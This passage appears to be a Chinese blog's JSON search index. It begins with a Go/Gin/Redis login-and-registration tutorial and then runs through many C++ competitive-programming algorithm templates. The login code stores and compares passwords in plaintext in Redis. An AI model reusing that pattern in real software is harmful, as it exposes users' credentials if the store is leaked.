}) r.POST(\"/loginform\", func(context *gin.Context) { username := context.PostForm(\"username\") password := context.PostForm(\"password\") rdb, err := redis.Dial(\"tcp\",\"127.0.0.1:6379\") if err != nil { panic(err) } exists, err := redis.Bool(rdb.Do(\"EXISTS\", username)) if exists != true { defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"用户名不存在\", }) return } res, err := rdb.Do(\"Get\", username) passget := string(res.([]byte)) if passget != password { defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"用户名或密码错误\", }) return } if err != nil { panic(err) } defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"登录成功\", }) }) r.POST(\"/registerform\", func(context *gin.Context) { username := context.PostForm(\"username\") password := context.PostForm(\"password\") rdb, err := redis.Dial(\"tcp\",\"127.0.0.1:6379\") if err != nil { panic(err) } exists, err := redis.Bool(rdb.Do(\"EXISTS\", username)) if exists == true { defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"用户名已存在\", }) return } _, err = rdb.Do(\"Set\", username, password) if err != nil { panic(err) } defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"注册成功\", }) }) r.Run(\":8080\") } ","date":"2022-03-29","objectID":"/go-auth/:5:0","tags":null,"title":"使用Go+Gin+Redis实现一个简单的登录注册系统","uri":"/go-auth/"},{"categories":null,"content":"Tarjan\u0026Topo void tarjan(int u) { dfn[u] = low[u] = ++tim; ins[u] = 1; stac[++top] = u; for(int v, i = h[u]; ~i; i = e[i].next) if(!dfn[(v = e[i].to)]) { tarjan(v); low[u] = min(low[u], low[v]); } else if(ins[v]) low[u] = min(low[u], low[v]); if(low[u] == dfn[u]) { int y; while(y = stac[top--]) { sd[y] = u; ins[y] = 0; if(u == y) break; p[u] += p[y]; } } } void topo() { queue \u003cint\u003e q; for(int i = 1; i \u003c= n; ++i) if(sd[i] == i \u0026\u0026 !in[i]) q.push(i), dis[i] = p[i]; while(!q.empty()) { int u = q.front(); q.pop(); for(int v, i = h[u]; ~i; i = e[i].next) { v = e[i].to; dis[v] = max(dis[v], dis[u] + p[v]); --in[v]; if(!in[v]) q.push(v); } } int ans = 0; for(int i = 1; i \u003c= n; ++i) ans = max(ans, dis[i]); printf(\"%d\\n\", ans); } ","date":"2022-03-09","objectID":"/templates/:1:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"ST void ST_Build() { for(int j = 1; j \u003c= 21; ++j) for(int i = 1; i + (1 \u003c\u003c j) - 1 \u003c= n; ++i) st[i][j] = max(st[i][j-1], st[i+(1\u003c\u003c(j-1))][j-1]); } int ST_query(int l, int r) { int k = lg2[r-l+1]; return max(st[l][k], st[r-(1\u003c\u003ck)+1][k]); } ","date":"2022-03-09","objectID":"/templates/:2:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"ST-BlackMagic struct RMQ { #define L(x) ((x-1)*siz+1) #define R(x) std::min(n, x*siz+1) #define bl(x) ((x-1)/siz+1) const int MAXB = 2050, siz = 50; int prf[MAXN], suf[MAXN], n, st[MAXB][13], lg2[MAXN], a[MAXN]; void init(int *s, int _n, int k) { n = _n; for(int i = 1; i \u003c= n; ++i) a[i] = s[i] % k, st[bl(i)][0] = min(st[bl(i)][0], a[i]); for(int i = 1; i \u003c= bl(n); ++i) { prf[L(i)] = a[L(i)]; suf[R(i)] = a[R(i)]; for(int j = L(i)+1; j \u003c= R(i); ++j) prf[j] = min(prf[j-1], a[j]); for(int j = R(i)-1; j \u003e= L(i); --j) suf[j] = min(suf[j+1], a[j]); } for(int j = 1; j \u003c= 12; ++j) for(int i = 1; i + (1 \u003c\u003c j) - 1 \u003c= bl(n); ++i) st[i][j] = min(st[i][j-1], st[i+(1\u003c\u003c(j-1))][j-1]); } int QST(int l, int r) { if(l \u003e r) return 0; int k = lg2[r-l+1]; return min(st[l][k], st[r-(1\u003c\u003ck)+1][k]); } int query(int l, int r) { if(bl(l) == bl(r)) { int res = 0; for(int i = l; i \u003c= r; ++i) res = max(res, a[i]); return res; } else return min(min(prf[r], suf[l]), QST(bl(l)+1, bl(r)-1)); } } ST; ","date":"2022-03-09","objectID":"/templates/:3:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"Manacher void Manacher() { int mr = 0, mid; for(int i = 0; i \u003c n; ++i) { p[i] = i \u003c mr ? min(p[(mid \u003c\u003c 1) - i], p[mid] + mid - i) : 1; for(; s[i-p[i]] == s[i+p[i]]; ++p[i]); if(p[i] + i \u003e mr) mr = i + p[i], mid = i; } } int main() { scanf(\"%s\", a); _n = strlen(a); s[0] = s[1] = '#'; n = 1; for(int i = 0; i \u003c _n; ++i) s[++n] = a[i], s[++n] = '#'; s[++n] = 0; Manacher(); for(int i = 0; i \u003c n; ++i) ans = max(ans, p[i]); printf(\"%d\\n\", ans-1); } ","date":"2022-03-09","objectID":"/templates/:4:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"线性基 for(int i = 1; i \u003c= n; ++i) { read(a); for(int j = 50; j \u003e= 0; --j) { if((a \u003e\u003e j) \u0026 1) { if(!p[j]) {p[j] = a; break;} a ^= p[j]; } } } for(int i = 50; i \u003e= 0; --i) if(p[i]) ans = max(ans, ans ^ p[i]); ","date":"2022-03-09","objectID":"/templates/:5:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"线性逆元 inv[1] = 1; for(int i = 2; i \u003c= n; ++i) inv[i] = 1ll * (P - P / i) % P * inv[P % i] % P; ","date":"2022-03-09","objectID":"/templates/:6:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"后缀数组 void getSA() { for(int i = 1; i \u003c= n; ++i) ++c[x[i] = s[i]]; for(int i = 1; i \u003c= m; ++i) c[i] += c[i-1]; for(int i = n; i \u003e= 1; --i) sa[c[x[i]]--] = i; for(int k = 1; k \u003c= n; k \u003c\u003c= 1) { int num = 0; for(int i = n - k + 1; i \u003c= n; ++i) y[++num] = i; for(int i = 1; i \u003c= n; ++i) if(sa[i] \u003e k) y[++num] = sa[i] - k; memset(c, 0, sizeof c); for(int i = 1; i \u003c= n; ++i) ++c[x[i]]; for(int i = 1; i \u003c= m; ++i) c[i] += c[i-1]; for(int i = n; i \u003e= 1; --i) sa[c[x[y[i]]]--] = y[i], y[i] = 0; swap(x, y); x[sa[1]] = 1; num = 0; for(int i = 1; i \u003c= n; ++i) x[sa[i]] = (y[sa[i-1]] == y[sa[i]] \u0026\u0026 y[sa[i-1]+k] == y[sa[i]+k]) ? num : ++num; if(num == n) break; m = num; } } ","date":"2022-03-09","objectID":"/templates/:7:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"点分治 void getroot(int u, int p, int S) { siz[u] = 1, f[u] = 0; for(int v, i = h[u]; ~i; i = e[i].next) if((v = e[i].to) != p \u0026\u0026 !vis[v]) getroot(v, u, S), siz[u] += siz[v], f[u] = max(f[u], siz[v]); f[u] = max(f[u], S - siz[u]); rt = f[u] \u003c f[rt] ? u : rt; } void getdis(int u, int p) { stk[++top] = dis[u]; for(int v, i = h[u]; ~i; i = e[i].next) if((v = e[i].to) != p \u0026\u0026 !vis[v]) dis[v] = dis[u] + e[i].w, getdis(v, u); } void solve(int u, int w, int t) { top = 0, dis[u] = w, getdis(u, 0); for(int i = 1; i \u003c= top; ++i) for(int j = 1; j \u003c= top; ++j) if(i != j) ans[stk[i] + stk[j]] += t; } void devide(int u) { solve(u, 0, 1); vis[u] = 1; for(int v, i = h[u]; ~i; i = e[i].next) if(!vis[(v = e[i].to)]) { solve(v, e[i].w, -1), rt = 0, f[0] = n; getroot(v, u, siz[u]), devide(rt); } } ","date":"2022-03-09","objectID":"/templates/:8:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"线段树 #define L(u) (u\u003c\u003c1) #define R(u) (u\u003c\u003c1|1) #define mid ((l+r)\u003e\u003e1) void PU(int u) {t[u] = (t[L(u)] + t[R(u)]) % P;} void ADD(int u, int l, int r, int k) { t[u] += (r - l + 1) * k % P; t[u] %= P; add[u] = (add[u] + k) % P; } void MUL(int u, int l, int r, int k) { t[u] = t[u] * k % P; add[u] = add[u] * k % P; mul[u] = mul[u] * k % P; } void PD(int u, int l, int r) { MUL(L(u), l, mid, mul[u]); MUL(R(u), mid+1, r, mul[u]); mul[u] = 1; ADD(L(u), l, mid, add[u]); ADD(R(u), mid+1, r, add[u]); add[u] = 0; } void build(int u, int l, int r) { mul[u] = 1; if(l == r) {t[u] = a[l]; return;} build(L(u), l, mid); build(R(u), mid+1, r); PU(u); } void MA(int u, int l, int r, int tl, int tr, int k) { if(tr \u003c l || tl \u003e r) return; if(tl \u003c= l \u0026\u0026 r \u003c= tr) {ADD(u, l, r, k); return;} PD(u, l, r); MA(L(u), l, mid, tl, tr, k); MA(R(u), mid+1, r, tl, tr, k); PU(u); } void MM(int u, int l, int r, int tl, int tr, int k) { if(tr \u003c l || tl \u003e r) return; if(tl \u003c= l \u0026\u0026 r \u003c= tr) {MUL(u, l, r, k); return;} PD(u, l, r); MM(L(u), l, mid, tl, tr, k); MM(R(u), mid+1, r, tl, tr, k); PU(u); } int Q(int u, int l, int r, int tl, int tr) { if(tr \u003c l || tl \u003e r) return 0; if(tl \u003c= l \u0026\u0026 r \u003c= tr) return t[u]; PD(u, l, r); return (Q(L(u), l, mid, tl, tr) + Q(R(u), mid+1, r, tl, tr)) % P; } ","date":"2022-03-09","objectID":"/templates/:9:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"三分 while(fabs(r-l) \u003e= eps) { double mid = (l + r) / 2; if(f(mid - eps) \u003c f(mid + eps)) l = mid; else r = mid; } ","date":"2022-03-09","objectID":"/templates/:10:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"树状数组 void U(int x, int k) {for(; x \u003c= n; t[x] += k, x += x\u0026-x);} int Q(int x) {int w = 0; for(; x; w += t[x], x -= x\u0026-x); return w;} ","date":"2022-03-09","objectID":"/templates/:11:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"高斯消元 for(int i = 1; i \u003c= n; ++i) { int p = i; for(int j = i + 1; j \u003c= n; ++j) if(fabs(a[j][i]) \u003e fabs(a[p][i])) p = j; if(a[p][i] == 0) {puts(\"No Solution\"); return 0;} for(int j = 1; j \u003c= n+1; ++j) swap(a[i][j], a[p][j]); for(int j = 1; j \u003c= n; ++j) { if(i == j) continue; double t = a[j][i] / a[i][i]; for(int k = i; k \u003c= n+1; ++k) a[j][k] -= a[i][k] * t; } } for(int i = 1; i \u003c= n; ++i) printf(\"%.2lf\\n\", a[i][n+1] / a[i][i]); ","date":"2022-03-09","objectID":"/templates/:12:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"最小生成树\u0026并查集 int findfa(int x) {return x == fa[x] ? x : fa[x] = findfa(fa[x]);} int main() { for(int i = 1; i \u003c= n; ++i) fa[i] = i; sort(e+1, e+m+1); for(int i = 1; i \u003c= m; ++i) { int x = findfa(e[i].u), y = findfa(e[i].v); if(x == y) continue; ans += e[i].w; ++cnt; if(cnt == n-1) break; fa[x] = y; } } ","date":"2022-03-09","objectID":"/templates/:13:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"DINIC bool bfs() { memset(d, -1, sizeof d); queue \u003cint\u003e q; q.push(s); d[s] = 0; while(!q.empty()) { int u = q.front(); q.pop(); for(int v, i = h[u]; ~i; i = e[i].next) if(d[v = e[i].to] == -1 \u0026\u0026 e[i].w \u003e 0) d[v] = d[u] + 1, q.push(v); } return d[t] != -1; } int dfs(int u, int f) { int r = 0; if(u == t) return f; for(int v, i = h[u]; ~i \u0026\u0026 r \u003c f; i = e[i].next) if(d[(v = e[i].to)] == d[u] + 1 \u0026\u0026 e[i].w \u003e 0) { int x = dfs(v, min(e[i].w, f-r)); e[i].w -= x; e[i^1].w += x; r += x; } if(!r) d[u] = -1; return r; } int dinic() { int x, ans = 0; while(bfs()) while(x = dfs(s, 1e9)) ans += x; return ans; } ","date":"2022-03-09","objectID":"/templates/:14:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"线性筛 for(int i = 2; i \u003c= n; ++i) { if(!notp[i]) p[++cntp] = i; for(int j = 1; 1ll*i*p[j] \u003c= n \u0026\u0026 j \u003c= cntp; ++j) { notp[i*p[j]] = 1; if(i % p[j] == 0) break; } } ","date":"2022-03-09","objectID":"/templates/:15:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"左偏树 int F(int x) {return x == fa[x] ? x : fa[x] = F(fa[x]);} int Merge(int x, int y) { if(x*y == 0) return x+y; if(v[x] \u003e v[y] || (v[x] == v[y] \u0026\u0026 x \u003e y)) swap(x, y); R(x) = Merge(R(x), y); fa[R(x)] = fa[L(x)] = x; if(dis[R(x)] \u003e dis[L(x)]) swap(L(x), R(x)); dis[x] = dis[R(x)] + 1; return x; } int Top(int x) {return del[x] ? -1 : v[x];} void Pop(int x) { if(del[x]) return; del[x] = 1; fa[L(x)] = L(x); fa[R(x)] = R(x); fa[x] = Merge(L(x), R(x)); } ","date":"2022-03-09","objectID":"/templates/:16:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"LCT bool nroot(int x) {return ch[fa[x]][0] == x || ch[fa[x]][1] == x;} void pushup(int x) {sumx[x] = sumx[ch[x][1]] ^ sumx[ch[x][0]] ^ val[x];} void pushr(int x) {swap(ch[x][1], ch[x][0]); rot[x] ^= 1;} void pushdown(int x) {if(rot[x]) {if(ch[x][0]) pushr(ch[x][0]); if(ch[x][1]) pushr(ch[x][1]); rot[x] = 0;}} void rotate(int x) { int y = fa[x], z = fa[y], k = (x == ch[y][1]); if(nroot(y)) ch[z][(y == ch[z][1])] = x; fa[x] = z; ch[y][k] = ch[x][k^1]; if(ch[x][k^1]) fa[ch[x][k^1]] = y; ch[x][k^1] = y; fa[y] = x; pushup(y); } void splay(int x) { int y = x, z = 0; st[++z] = y; while(nroot(y)) st[++z] = y = fa[y]; while(z) pushdown(st[z--]); for(int y; nroot(x); rotate(x)) if(nroot(y = fa[x])) rotate((y == ch[fa[y]][0]) ^ (x == ch[y][0]) ? x : y); pushup(x); } void access(int x) {for(int y = 0; x; x = fa[y = x]) splay(x), ch[x][1] = y, pushup(x);} void makeroot(int x) {access(x); splay(x); pushr(x);} int findroot(int x) {access(x); splay(x); for(; ch[x][0]; x = ch[x][0]) pushdown(x); splay(x); return x;} void spilit(int x, int y) {makeroot(x); access(y); splay(y);} void link(int x, int y) {makeroot(x); if(findroot(y) != x) fa[x] = y;} void cut(int x, int y) {makeroot(x); if(findroot(y) == x \u0026\u0026 fa[y] == x \u0026\u0026 !ch[y][0]) {fa[y] = ch[x][1] = 0; pushup(x);}} ","date":"2022-03-09","objectID":"/templates/:17:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"KMP for(int i = 2, j = 0; i \u003c= n; ++i) { while(j \u0026\u0026 s[i] != s[j+1]) j = nxt[j]; if(s[j+1] == s[i]) ++j; nxt[i] = j; } for(int i = 1, j = 0; i \u003c= m; ++i) { while(j \u003e 0 \u0026\u0026 t[i] != s[j+1]) j = nxt[j]; if(s[j+1] == t[i]) ++j; if(j == n) printf(\"%d\\n\", i-n+1); } ","date":"2022-03-09","objectID":"/templates/:18:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"SAM struct SoumAsuMire { int ch[MAXN][26], fa[MAXN], last, cnt, len[MAXN]; void insert(int c) { int p = last, np = ++cnt; last = np; len[np] = len[p] + 1; for(; p \u0026\u0026 !ch[p][c]; ch[p][c] = np, p = fa[p]); if(!p) fa[np] = 1; else { int q = ch[p][c]; if(len[q] == len[p] + 1) fa[np] = q; else { int nq = ++cnt; len[nq] = len[p] + 1; memcpy(ch[nq], ch[q], sizeof ch[q]); fa[nq] = fa[q]; fa[q] = fa[np] = nq; for(; p \u0026\u0026 ch[p][c] == q; ch[p][c] = nq, p = fa[p]); } } } void build(char *s) { int n = strlen(s+1); last = 1; for(int i = 1; i \u003c= n; ++i) insert(s[i] - 'a'); } int getans() { int ans = 0; for(int i = 2; i \u003c= cnt; ++i) ans += len[i] - len[fa[i]]; return ans; } } SAM; ","date":"2022-03-09","objectID":"/templates/:19:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"LCA(ST) void dfsRMQ(int u, int p) { st[++idx][0] = u; dfn[u] = idx; dep[u] = dep[p] + 1; for(int v, i = h[u]; ~i; i = e[i].next) if((v = e[i].to) != p) dfsRMQ(v, u), st[++idx][0] = u; } void LCAinit() { for(int i = 2; i \u003c= (n \u003c\u003c 1); ++i) lg2[i] = lg2[i\u003e\u003e1] + 1; dep[1] = 1; dfsRMQ(rt, 0); for(int j = 1; j \u003c 20; ++j) for(int i = 1; i + (1 \u003c\u003c j) \u003c= (n \u003c\u003c 1); ++i) st[i][j] = Min(st[i][j-1], st[i+(1\u003c\u003c(j-1))][j-1]); } int LCA(int x, int y) { x = dfn[x]; y = dfn[y]; if(x \u003e y) swap(x, y); int k = lg2[y-x+1]; return Min(st[x][k], st[y-(1\u003c\u003ck)+1][k]); } ","date":"2022-03-09","objectID":"/templates/:20:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"mcmf bool SPFA() { memset(d, 63, sizeof d); memset(vis, 0, sizeof vis); memset(flow, 63, sizeof flow); queue \u003cint\u003e q; q.push(s); d[s] = 0; vis[s] = 1; while(!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for(int v, i = h[u]; ~i; i = e[i].next) if(d[v = e[i].to] \u003e d[u] + e[i].c \u0026\u0026 e[i].f) { d[v] = d[u] + e[i].c; pos[v] = i; fa[v] = u; flow[v] = min(flow[u], e[i].f); if(!vis[v]) vis[v] = 1, q.push(v); } } return flow[s] != flow[t]; } void mcmf() { while(SPFA()) { mc += flow[t]; mf += flow[t] * d[t]; for(int u = t; u != s; u = fa[u]) e[pos[u]].f -= flow[t], e[pos[u]^1].f += flow[t]; } } ","date":"2022-03-09","objectID":"/templates/:21:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"AC自动机 #include \u003cbits/stdc++.h\u003eusing namespace std; const int S = 2000050, T = 200050; struct Edge {int to, next;} e[T]; char s[S]; int n, h[T], cnt, ch[T][26], fail[T], match[T], siz[T], tot = 1, en; queue \u003cint\u003e q; void addedge(int u, int v) {e[en] = (Edge) {v, h[u]}; h[u] = en++;} void dfs(int u) { for(int v, i = h[u]; ~i; i = e[i].next) dfs(v = e[i].to), siz[u] += siz[v]; } int main() { scanf(\"%d\", \u0026n); memset(h, -1, sizeof h); for(int i = 1; i \u003c= n; ++i) { scanf(\"%s\", s); int u = 1, j; for(u = 1, j = 0; s[j]; ++j) { int c = s[j] - 'a'; if(!ch[u][c]) ch[u][c] = ++tot; u = ch[u][c]; } match[i] = u; } for(int i = 0; i \u003c 26; ++i) ch[0][i] = 1; q.push(1); while(!q.empty()) { int u = q.front(); q.pop(); for(int i = 0; i \u003c 26; ++i) if(ch[u][i]) { fail[ch[u][i]] = ch[fail[u]][i]; q.push(ch[u][i]); } else ch[u][i] = ch[fail[u]][i]; } scanf(\"%s\", s); for(int u = 1, i = 0; s[i]; ++i) ++siz[u = ch[u][s[i]-'a']]; for(int i = 2; i \u003c= tot; ++i) addedge(fail[i], i); dfs(1); for(int i = 1; i \u003c= n; ++i) printf(\"%d\\n\", siz[match[i]]); puts(\"\"); } ","date":"2022-03-09","objectID":"/templates/:22:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"dijkstra void dijkstra() { memset(d, 0x3f, sizeof d); d[s] = 0; q.push((D) {s, 0}); while(!q.empty()) { int u = q.top().u; q.pop(); if(vis[u]) continue; vis[u] = 1; for(int v, i = h[u]; ~i; i = e[i].next) if(d[v = e[i].to] \u003e d[u] + e[i].w) { d[v] = d[u] + e[i].w; if(!vis[v]) q.push((D) {v, d[v]}); } } } ","date":"2022-03-09","objectID":"/templates/:23:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"树哈希 ull Hash(int u, int p) { ull q[MAXN], ans = X; int top = 0; for(int i = h[u]; ~i; i = e[i].next) if(e[i].to != p) q[++top] = Hash(e[i].to, u); sort(q+1, q+top+1); for(int i = 1; i \u003c= top; ++i) ans = ans * P + q[i]; return ans * P + X + 1; } ","date":"2022-03-09","objectID":"/templates/:24:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"CDQ分治 struct BITS { int t[MAXN]; void U(int x, int k) {for(; x \u003c= m; t[x] += k, x += x\u0026-x);} int Q(int x) {int res = 0; for(; x; res += t[x], x -= x\u0026-x); return res;} } T; void cdq(int l, int r) { if(l == r) return; int mid = (l + r) \u003e\u003e 1; cdq(l, mid); cdq(mid+1, r); sort(a+l, a+mid+1, cmpy); sort(a+mid+1, a+r+1, cmpy); int i = mid + 1, j = l; for(; i \u003c= r; ++i) { for(; a[j].y \u003c= a[i].y \u0026\u0026 j \u003c= mid; ++j) T.U(a[j].z, a[j].w); a[i].ans += T.Q(a[i].z); } for(int k = l; k \u003c j; ++k) T.U(a[k].z, -a[k].w); } int main() { read(_n); read(m); for(int i = 1; i \u003c= _n; ++i) read(b[i].x), read(b[i].y), read(b[i].z); sort(b+1, b+_n+1, cmpx); for(int c = 0, i = 1; i \u003c= _n; ++i) { ++c; if(b[i].x != b[i+1].x || b[i].y != b[i+1].y || b[i].z != b[i+1].z) a[++n] = b[i], a[n].w = c, c = 0; } cdq(1, n); for(int i = 1; i \u003c= n; ++i) cnt[a[i].ans + a[i].w - 1] += a[i].w; for(int i = 0; i \u003c _n; ++i) printf(\"%d\\n\", cnt[i]); } ","date":"2022-03-09","objectID":"/templates/:25:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"Lucas int C(int n, int m) { if(m \u003e n) return 0; return 1ll * fac[n] * power(fac[m], P-2) * power(fac[n-m], P-2); } int Lucas(int n, int m) { if(m == 0) return 1; return 1ll * C(n%P, m%P) * Lucas(n/P, m/P) % P; } ","date":"2022-03-09","objectID":"/templates/:26:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"二分图 bool dfs(int u) { for(int v, i = h[u]; ~i; i = e[i].next) { if(vis[v = e[i].to] != tag) { vis[v] = tag; if(!match[v] || dfs(match[v])) { match[v] = u; return 1; } } } return 0; } ","date":"2022-03-09","objectID":"/templates/:27:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"莫队二次离线 #include \u003cbits/stdc++.h\u003eusing namespace std; const int MAXN = 100050; typedef long long lint; void read(int \u0026x) { char ch; while(ch = getchar(), ch \u003c '!'); x = ch - 48; while(ch = getchar(), ch \u003e '!') x = (x \u003c\u003c 3) + (x \u003c\u003c 1) + ch - 48; } struct Qry {int l, r, id; lint ans;} q[MAXN]; struct T{int l, r, id;}; int n, m, a[MAXN], siz[MAXN], k, blsz, bl[MAXN], t[MAXN], pref[MAXN]; vector \u003cint\u003e buc; vector \u003cT\u003e v[MAXN]; lint ans[MAXN]; int cmp(Qry a, Qry b) {return bl[a.l] == bl[b.l] ? a.r \u003c b.r : a.l \u003c b.l;} int main() { read(n); read(m); read(k); blsz = sqrt(n); if(k \u003e 14) {for(int i = 1; i \u003c= m; ++i) puts(\"0\"); return 0;} for(int i = 1; i \u003c= n; ++i) read(a[i]); for(int i = 0; i \u003c 16384; ++i) if((siz[i] = siz[(i\u003e\u003e1)] + (i\u00261)) == k) buc.push_back(i); for(int i = 1; i \u003c= m; ++i) read(q[i].l), read(q[i].r), q[i].id = i; for(int i = 1; i \u003c= n; ++i) bl[i] = (i-1) / blsz + 1; sort(q+1, q+m+1, cmp); for(int i = 1; i \u003c= n; ++i) { for(int j = 0; j \u003c buc.size(); ++j) ++t[a[i]^buc[j]]; pref[i] = t[a[i+1]]; } for(int L = 1, R = 0, i = 1; i \u003c= m; ++i) { int l = q[i].l, r = q[i].r; if(L \u003c l) v[R].push_back((T) {L, l-1, -i}); while(L \u003c l) {q[i].ans += pref[L-1]; ++L;} if(L \u003e l) v[R].push_back((T) {l, L-1, i}); while(L \u003e l) {q[i].ans -= pref[L-2]; --L;} if(R \u003c r) v[L-1].push_back((T) {R+1, r, -i}); while(R \u003c r) {q[i].ans += pref[R]; ++R;} if(R \u003e r) v[L-1].push_back((T) {r+1, R, i}); while(R \u003e r) {q[i].ans -= pref[R-1]; --R;} } memset(t, 0, sizeof t); for(int l, r, id, i = 1; i \u003c= n; ++i) { for(int j = 0; j \u003c buc.size(); ++j) ++t[a[i]^buc[j]]; for(int o = 0; o \u003c v[i].size(); ++o) { l = v[i][o].l; r = v[i][o].r; id = v[i][o].id; for(int j = l, tmp = 0; j \u003c= r; ++j) { tmp = t[a[j]]; if(j \u003c= i \u0026\u0026 !k) --tmp; if(id \u003e 0) q[id].ans += tmp; else q[-id].ans -= tmp; } } } for(int i = 1; i \u003c= m; ++i) q[i].ans += q[i-1].ans; for(int i = 1; i \u003c= m; ++i) ans[q[i].id] = q[i].ans; for(int i = 1; i \u003c= m; ++i) printf(\"%lld\\n\", ans[i]); } ","date":"2022-03-09","objectID":"/templates/:28:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"莫比乌斯反演 void GetMu() { mu[1] = 1; for(int i = 2; i \u003c= 10000000; ++i) { if(!vis[i]) p[++cnt] = i, mu[i] = -1; for(int j = 1; j \u003c= cnt \u0026\u0026 p[j] * i \u003c= 10000000; ++j) { vis[p[j]*i] = 1; if(i % p[j]) mu[p[j]*i] = -mu[i]; } } for(int i = 1; i \u003c= cnt; ++i) for(int j = 1; j * p[i] \u003c= 10000000; ++j) f[j*p[i]] += mu[j]; for(int i = 1; i \u003c= 10000000; ++i) pref[i] = pref[i-1] + f[i]; } lint calc(int a, int b) { lint res = 0; if(a \u003e b) swap(a, b); for(int l = 1, r = 0; l \u003c= a; l = r + 1) { r = min(a/(a/l), b/(b/l)); res += (pref[r] - pref[l-1])*1ll*(a/l)*(b/l); } return res; } ","date":"2022-03-09","objectID":"/templates/:29:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"树剖 void ADD(int u, int l, int r, int k) {t[u] = (t[u] + 1ll*k*(r-l+1)%P) % P; tag[u] = (tag[u] + k) % P;} void PD(int u, int l, int r) {ADD(L(u), l, mid, tag[u]); ADD(R(u), mid+1, r, tag[u]); tag[u] = 0;} void PU(int u) {t[u] = (t[L(u)] + t[R(u)]) % P;} void build(int u, int l, int r) { if(l == r) {t[u] = w[id[l]]; return; } build(L(u), l, mid); build(R(u), mid+1, r); PU(u); } void upd(int u, int l, int r, int tl, int tr, int k) { if(tr \u003c l || tl \u003e r) return; if(tl \u003c= l \u0026\u0026 r \u003c= tr) ADD(u, l, r, k); else PD(u, l, r), upd(L(u), l, mid, tl, tr, k), upd(R(u), mid+1, r, tl, tr, k), PU(u); } int qry(int u, int l, int r, int tl, int tr) { if(tr \u003c l || tl \u003e r) return 0; if(tl \u003c= l \u0026\u0026 r \u003c= tr) return t[u]; PD(u, l, r); return (qry(L(u), l, mid, tl, tr) + qry(R(u), mid+1, r, tl, tr)) % P; } void dfs1(int u, int p) { fa[u] = p; siz[u] = 1; dep[u] = dep[p] + 1; for(int v, i = h[u]; ~i; i = e[i].next) if((v = e[i].to) != p) { dfs1(v, u); siz[u] += siz[v]; if(siz[son[u]] \u003c siz[v]) son[u] = v; } } void dfs2(int u, int p) { id[dfn[u] = ++idx] = u; top[u] = p; if(son[u]) dfs2(son[u], p); for(int v, i = h[u]; ~i; i = e[i].next) if((v = e[i].to) != fa[u] \u0026\u0026 v != son[u]) dfs2(v, v); } void addpath(int x, int y, int k) { for(; top[x] != top[y]; x = fa[top[x]]) { if(dep[top[x]] \u003c dep[top[y]]) swap(x, y); upd(1, 1, n, dfn[top[x]], dfn[x], k); } if(dep[x] \u003e dep[y]) swap(x, y); upd(1, 1, n, dfn[x], dfn[y], k); } int qrypath(int x, int y) { int res = 0; for(; top[x] != top[y]; x = fa[top[x]]) { if(dep[top[x]] \u003c dep[top[y]]) swap(x, y); res = (res + qry(1, 1, n, dfn[top[x]], dfn[x])) % P; } if(dep[x] \u003e dep[y]) swap(x, y); return (res + qry(1, 1, n, dfn[x], dfn[y])) % P; } void addroot(int x, int k) {upd(1, 1, n, dfn[x], dfn[x] + siz[x] - 1, k); } int qryroot(int x) {return qry(1, 1, n, dfn[x], dfn[x] + siz[x] - 1);} ","date":"2022-03-09","objectID":"/templates/:30:0","tags":null,"title":"板子 (ver.诗乃)","uri":"/templates/"},{"categories":null,"content":"主席树 struct JZM_T {int ch[2], v;} t[MAXN \u003c\u003c 6]; int cnt, rt[MAXN \u003c\u003c 6], o[MAXN], a[MAXN], n, m; void build(int \u0026u, int l, int r) { t[u = ++cnt].v = 0; if(l != r) build(L(u), l, mid), build(R(u), mid+1, r); } void update(int \u0026u, int v, int l, int r, int p, int k) { t[u = ++cnt] = t[v]; t[u].v += k; if(l != r) p \u003c= mid ? update(L(u), L(v), l, mid, p, k) : update(R(u), R(v), mid+1, r, p, k); } int query(int tl, int tr, int l, int r, int k) { if(l == r) return 